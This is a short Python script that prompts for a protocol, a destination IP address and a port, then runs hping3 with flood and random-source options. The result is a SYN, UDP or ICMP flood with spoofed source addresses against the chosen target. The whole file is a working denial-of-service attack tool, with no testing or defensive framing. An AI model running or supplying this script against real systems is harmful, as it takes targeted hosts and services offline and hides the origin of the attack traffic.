import subprocess
import re

def validate_ip_address(ip_address):
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if re.match(pattern, ip_address):
        components = ip_address.split('.')
        if all(0 <= int(comp) <= 255 for comp in components):
            return True
        else:
         return False

while True:
    protocol = input("Please select the protocol (tcp/udp/icmp): ")
    if protocol.lower() in ["tcp", "udp", "icmp"]:
        break
    else:
        print("Invalid protocol. Please enter 'tcp', 'udp', or 'icmp'.")

while True:
    destination = input("Please enter the destination address: ")
    if not destination:
        print("Empty   Please provide a valid address.")
    elif not validate_ip_address(destination):
        print("Invalid destination address. Please enter a valid IP address.")
    else:
        break
        
        

if protocol.lower() == "tcp":
    while True:
        port = input("Please enter the port number: ")
        if not port.isdigit():
            print("Invalid port number. Please enter a valid numeric port.")
        else:
            break

    command = f"hping3 -S -p {port} --rand-source --flood {destination}"


elif protocol.lower() == "udp":
    while True:
        port = input("Please enter the port number: ")
        if not port.isdigit():
            print("Invalid port number. Please enter a valid numeric port.")
        else:
            break

    command = f"hping3 -2 -p {port} --rand-source --flood {destination}"
    

else:
    command = f"hping3 -1 --rand-source --flood {destination}"

subprocess.run(command, shell=True)
